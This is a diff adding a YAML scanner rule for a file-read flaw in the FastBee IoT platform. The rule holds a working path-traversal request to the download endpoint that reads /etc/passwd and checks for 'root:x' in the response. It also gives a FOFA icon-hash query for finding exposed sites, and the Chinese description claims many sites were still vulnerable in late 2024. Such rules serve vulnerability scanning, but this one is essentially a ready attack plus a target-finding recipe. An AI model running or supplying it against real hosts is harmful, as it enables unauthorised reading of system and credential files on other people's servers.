@@ -1,0 +1,15 @@
+name: FastBee-fileread  #FastBee开源物联网平台   
+rules: 
+  - method: GET  
+    path: /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd
+    headers:
+    body:
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: root:x                    
+detail:                          
+  description: "FastBee是一个简单易用的开源物联网平台,更适合中小企业和个人快速学习和搭建设备联网平台。可用于智能家居、智慧办公、智慧社区、农业监测、水利监测、工业控制等领域，截止到2024.10.1仍存在较多该漏洞网站"
+  search:             
+    fofa: icon_hash="-307138793"
+    鹰图: 
